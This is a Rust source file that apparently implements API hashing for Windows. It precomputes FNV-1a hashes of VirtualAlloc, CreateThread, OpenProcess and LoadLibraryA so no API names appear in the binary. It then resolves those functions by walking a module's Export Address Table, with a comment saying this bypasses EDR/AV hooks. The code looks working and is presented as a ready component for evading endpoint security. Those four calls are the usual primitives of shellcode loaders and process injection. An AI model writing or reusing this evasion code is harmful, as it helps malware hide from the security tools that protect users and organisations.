/// FNV-1a 32-bit hash — evaluable at compile time for constant API hashes.
pub const fn fnv1a(s: &[u8]) -> u32 {
    let mut h: u32 = 2166136261;
    let mut i = 0;
    while i < s.len() {
        h ^= s[i] as u32;
        h = h.wrapping_mul(16777619);
        i += 1;
    }
    h
}

// Pre-computed hashes — no API name string visible in the release binary
pub const H_VIRTUAL_ALLOC: u32  = fnv1a(b"VirtualAlloc");
pub const H_CREATE_THREAD: u32  = fnv1a(b"CreateThread");
pub const H_OPEN_PROCESS: u32   = fnv1a(b"OpenProcess");
pub const H_LOAD_LIBRARY_A: u32 = fnv1a(b"LoadLibraryA");

/// Resolve a Windows API by FNV-1a hash by walking the Export Address Table.
///
/// Bypasses IAT hooks placed by EDR/AV in userland DLL stubs.
/// `module_name` must be a null-terminated byte slice (e.g. `b"kernel32.dll\0"`).
///
/// # Safety
/// The caller must ensure the module is loaded and cast the returned pointer
/// to the correct function signature before calling it.
#[cfg(windows)]
pub unsafe fn resolve(module_name: &[u8], target_hash: u32) -> Option<*const ()> {
    use std::ffi::CStr;
    use windows::Win32::System::LibraryLoader::GetModuleHandleA;
    use windows::core::PCSTR;

    let hmod = GetModuleHandleA(PCSTR(module_name.as_ptr())).ok()?.0 as *const u8;

    // DOS header: e_lfanew (RVA to NT headers) is at byte offset 60
    let e_lfanew = *(hmod.add(60) as *const i32) as usize;

    // NT headers layout (x64):
    //   +0   Signature       (4)
    //   +4   FileHeader      (20)
    //   +24  OptionalHeader64 (112 bytes before DataDirectory[0])
    //   +136 DataDirectory[0].VirtualAddress  <- export table RVA
    let export_rva = *(hmod.add(e_lfanew + 136) as *const u32) as usize;
    if export_rva == 0 {
        return None;
    }

    // IMAGE_EXPORT_DIRECTORY offsets:
    //   +24 NumberOfNames       (4)
    //   +28 AddressOfFunctions  (4)
    //   +32 AddressOfNames      (4)
    //   +36 AddressOfNameOrdinals (4)
    let exp          = hmod.add(export_rva);
    let n_names      = *(exp.add(24) as *const u32) as usize;
    let fn_rvas      = hmod.add(*(exp.add(28) as *const u32) as usize) as *const u32;
    let name_rvas    = hmod.add(*(exp.add(32) as *const u32) as usize) as *const u32;
    let ordinals     = hmod.add(*(exp.add(36) as *const u32) as usize) as *const u16;

    for i in 0..n_names {
        let name = CStr::from_ptr(
            hmod.add(*name_rvas.add(i) as usize) as *const i8
        ).to_bytes();

        if fnv1a(name) == target_hash {
            let ord    = *ordinals.add(i) as usize;
            let fn_rva = *fn_rvas.add(ord) as usize;
            return Some(hmod.add(fn_rva) as *const ());
        }
    }
    None
}
